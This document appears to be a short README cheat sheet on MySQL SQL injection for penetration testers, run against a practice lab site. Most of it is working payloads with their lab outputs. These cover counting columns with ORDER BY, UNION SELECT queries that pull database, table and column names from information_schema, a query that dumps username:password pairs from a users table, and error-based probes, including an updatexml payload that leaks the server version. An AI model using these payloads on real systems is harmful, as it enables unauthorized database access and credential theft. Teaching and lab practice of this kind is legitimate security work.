# SQL Injections for Pentesters

by: @Anake    (Anakein)
email: anakein [@] protonmail [dot] ch

Hello my friends, this is my repo about sql injections. 

References:

 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
 http://www.securityidiots.com/Web-Pentest/SQL-Injection
 
 
LAB: http://leettime.net/sqlninja.com/index.php


## MYSQL Union Based

### Extract database with information_schema

First you need to know the number of columns, you can use `order by`

```sql
order by 1
order by 2
order by 3
...
order by XXX
```

OR

`1' order by 1,2,3%23`



Then the following codes will extract the databases'name, tables'name, columns'name.

#### Extract DATABASE NAME

`1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`

OUTPUT:     leettime_761wHole

#### Extract TABLES NAME

`1' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C),3+fRoM+information_schema.tables+wHeRe+table_schema=database()%23`

OUTPUT:     |testtable1|,|userlogs|,|users|

#### Extract COLUMNS NAME

>>> REMEMBER USE SINGLE QUOTE  

```

In mysql there is a particularity

String inside strings duplicate quotes!

' blablabla ''string'' '

String >> string >> string

'blablabla '' blablabla '''' string '''' '' '

This used with frequency in mysql links.

```


`1' UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C),3+fRoM+information_schema.columns+wHeRe+table_name='users'%23`

OUTPUT:    |id|,|username|,|password|,|user_type|,|sec_code|  

#### EXTRACT DATA

`1' union Select all 1,group_concat(0x7c,username,0x3a,password,0x7c),3 from users%23`

OUTPUT: |injector:khan|,|decompiler:hacktract|,|devilhunte:dante|,|Zen:sec-idiots|,|Zenodermus:security-i|,|grayhat:hacker|,|khan:haxor|,|admin:sadmin|

OR you can add limit using the `limit 0,1`, `limit 1,1`, `limit 2,1`...

`1' union Select 1,concat(username,0x3a,password),3 from users limit 2,1%23`

OUTPUT: decompiler:hacktract

## MYSQL Error Based

find errors, and interpreter. For example:

```
1'   out: 1' limit 1'
1/   out: error
1*   out: error
1--  out: no error  (Booowww)
1-- -  out: no error

Continue

1 and true;-- -    out: no error
1 and false;-- -   out: Invalid Input parameter

1 order by 7-- -   out: error (Unknown column '7' in 'order clause')
1 order by 5-- -   out: no error  (us have 5 columns)

```

### UpdateXML function

`AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--`

OUTPUT: Error While Selection process : XPATH syntax error: '~5.6.44-cll-lve~'






Credits: @zc00l
